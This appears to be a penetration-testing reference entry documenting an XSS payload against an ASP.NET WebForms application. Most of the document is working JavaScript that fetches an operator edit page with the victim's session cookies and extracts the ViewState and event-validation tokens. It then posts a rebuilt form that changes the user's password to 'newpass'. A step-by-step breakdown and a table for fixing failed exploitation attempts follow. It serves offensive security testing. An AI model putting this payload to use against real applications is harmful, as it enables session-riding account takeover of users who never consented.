# Example: ASP.NET ViewState + Password Change

**Scenario:** Change a user's password via XSS in an ASP.NET WebForms application using ViewState tokens.

## Scenario Details

| Attribute | Value |
|-----------|-------|
| **Token Location** | Hidden form fields: `__VIEWSTATE`, `__EVENTVALIDATION`, `__VIEWSTATEGENERATOR` |
| **Target Action** | POST to `/Operators/Operator_Edit.aspx` to change password |
| **Content-Type** | `application/x-www-form-urlencoded` |
| **Framework** | ASP.NET WebForms |
| **Constraint** | Must preserve all form fields including ViewState |

## Key Techniques

1. **Page fetch + DOMParser**: Fetch the form page and parse it as HTML
2. **ViewState extraction**: Extract multiple ASP.NET hidden fields
3. **Complete form reconstruction**: Must include ALL form fields, not just changed values
4. **EventTarget pattern**: ASP.NET postback mechanism via `__EVENTTARGET`

## Payload

```javascript
(function () {
    // Target URLs
    var getUrl = "/AegisPOC_32160014/Operators/Operator_Edit.aspx";
    var postUrl = "/AegisPOC_32160014/Operators/Operator_Edit.aspx";

    // Step 1: Fetch the form page to extract ViewState and other tokens
    fetch(getUrl, { credentials: "include" })
        .then(response => response.text())
        .then(html => {
            var parser = new DOMParser();
            var doc = parser.parseFromString(html, "text/html");

            // Extract dynamic form values
            var viewState = doc.querySelector("input[name='__VIEWSTATE']").value;
            var eventValidation = doc.querySelector("input[name='__EVENTVALIDATION']").value;
            var viewStateGen = doc.querySelector("input[name='__VIEWSTATEGENERATOR']").value;

            // Step 2: Construct the POST request payload
            var formData = new URLSearchParams();
            formData.append("__EVENTTARGET", "ctl00$MainContentPlaceHolder$lbFinish");
            formData.append("__EVENTARGUMENT", "");
            formData.append("__LASTFOCUS", "");
            formData.append("__VIEWSTATE", viewState);
            formData.append("__VIEWSTATEGENERATOR", viewStateGen);
            formData.append("__SCROLLPOSITIONX", "0");
            formData.append("__SCROLLPOSITIONY", "0");
            formData.append("__EVENTVALIDATION", eventValidation);
            formData.append("adobe_hidden", "none");

            // Change password to "newpass"
            formData.append("ctl00$MainContentPlaceHolder$tbPassword", "newpass");
            formData.append("ctl00$MainContentPlaceHolder$tbPasswordConf", "newpass");

            // Required static fields (unchanged)
            formData.append("ctl00$MainContentPlaceHolder$tbLastName", "Coordinator");
            formData.append("ctl00$MainContentPlaceHolder$tbFirstName", "One");
            formData.append("ctl00$MainContentPlaceHolder$tbOperatorID", "newadmin");
            formData.append("ctl00$MainContentPlaceHolder$tbPinID", "");
            formData.append("ctl00$MainContentPlaceHolder$tbMiddleName", "1");
            formData.append("ctl00$MainContentPlaceHolder$tbBarcode", "");
            formData.append("ctl00$MainContentPlaceHolder$ddGroup", "1");
            formData.append("ctl00$MainContentPlaceHolder$ddLanguage", "en-us");
            formData.append("ctl00$MainContentPlaceHolder$cbActive", "on");
            formData.append("ctl00$MainContentPlaceHolder$tbStartPage", "");
            formData.append("ctl00$MainContentPlaceHolder$ddlHomeLocation", "15");
            formData.append("ctl00$MainContentPlaceHolder$tbeMail", "added_user@praetorian.com");
            formData.append("ctl00$MainContentPlaceHolder$tbOpPhoneNumber", "");
            formData.append("ctl00$MainContentPlaceHolder$txtInstrumentPassword", "");
            formData.append("ctl00$MainContentPlaceHolder$tbComments", "");
            formData.append("ctl00$MainContentPlaceHolder$ddlFacility", "1");

            // Step 3: Send the POST request with credentials
            fetch(postUrl, {
                method: "POST",
                credentials: "include",
                headers: { "Content-Type": "application/x-www-form-urlencoded" },
                body: formData.toString()
            }).then(response => {
                if (response.ok) {
                    console.log("Password changed successfully!");
                } else {
                    console.log("Password change failed.");
                }
            }).catch(error => console.error("Error:", error));
        })
        .catch(error => console.error("Error fetching GET request:", error));
})();
```

## Code Breakdown

### Stage 1: Fetch Form Page

```javascript
fetch(getUrl, { credentials: "include" })
    .then(response => response.text())
    .then(html => {
        var parser = new DOMParser();
        var doc = parser.parseFromString(html, "text/html");
```

- `credentials: "include"` ensures session cookies are sent
- DOMParser creates a queryable document from HTML string
- Safer than regex for complex HTML structures

### Stage 2: Extract ASP.NET Tokens

```javascript
var viewState = doc.querySelector("input[name='__VIEWSTATE']").value;
var eventValidation = doc.querySelector("input[name='__EVENTVALIDATION']").value;
var viewStateGen = doc.querySelector("input[name='__VIEWSTATEGENERATOR']").value;
```

**ASP.NET Hidden Fields Explained:**

| Field | Purpose |
|-------|---------|
| `__VIEWSTATE` | Serialized page state (controls, data) - **required** |
| `__EVENTVALIDATION` | Validates postback came from expected controls - **required** |
| `__VIEWSTATEGENERATOR` | Hash for ViewState validation - **required** |
| `__EVENTTARGET` | Which control triggered the postback |
| `__EVENTARGUMENT` | Arguments for the event |

### Stage 3: Construct Complete Form

```javascript
var formData = new URLSearchParams();

// ASP.NET infrastructure fields
formData.append("__EVENTTARGET", "ctl00$MainContentPlaceHolder$lbFinish");
formData.append("__VIEWSTATE", viewState);
formData.append("__EVENTVALIDATION", eventValidation);
// ... all other fields
```

**Critical**: ASP.NET WebForms requires ALL form fields to be present. Missing fields = validation failure.

### Stage 4: Submit Modified Form

```javascript
fetch(postUrl, {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: formData.toString()
})
```

- Same URL for GET and POST (ASP.NET postback model)
- Form-urlencoded body (not JSON)
- Credentials included for session

## ASP.NET-Specific Patterns

### Control ID Naming

ASP.NET generates control IDs with naming container prefixes:

```
ctl00$MainContentPlaceHolder$tbPassword
│     │                      │
│     │                      └─ Control ID (tbPassword)
│     └─ ContentPlaceHolder ID
└─ Page/MasterPage prefix
```

### EventTarget for Button Clicks

Instead of clicking a button, set `__EVENTTARGET` to the button's client ID:

```javascript
formData.append("__EVENTTARGET", "ctl00$MainContentPlaceHolder$lbFinish");
```

This simulates clicking the "Finish" link button.

### ViewState Size Warning

ViewState can be very large (10KB+). This payload handles it correctly by:
1. Extracting the full value
2. Passing it unchanged in the POST

## Why This Pattern

- **ASP.NET WebForms**: Uses ViewState instead of simple CSRF tokens
- **Complete form required**: Can't just send the changed fields
- **Postback model**: Same URL for GET and POST, uses `__EVENTTARGET`
- **DOMParser approach**: More reliable than regex for ASP.NET's complex markup

## Testing Notes

1. Verify all `__VIEWSTATE*` and `__EVENTVALIDATION` fields exist
2. Check control ID format (may vary by page structure)
3. Ensure all required form fields are included
4. Test with different user sessions (ViewState is session-specific)
5. Watch for `__PREVIOUSPAGE` field on wizard/multi-step forms

## Common ASP.NET Exploitation Failures

| Issue | Cause | Fix |
|-------|-------|-----|
| ViewState validation error | Missing/corrupt ViewState | Re-fetch page before each request |
| Event validation error | Missing `__EVENTVALIDATION` | Include extracted value |
| Control not found | Wrong `__EVENTTARGET` | Check actual control client ID |
| Session timeout | ViewState expired | Complete attack in single session |
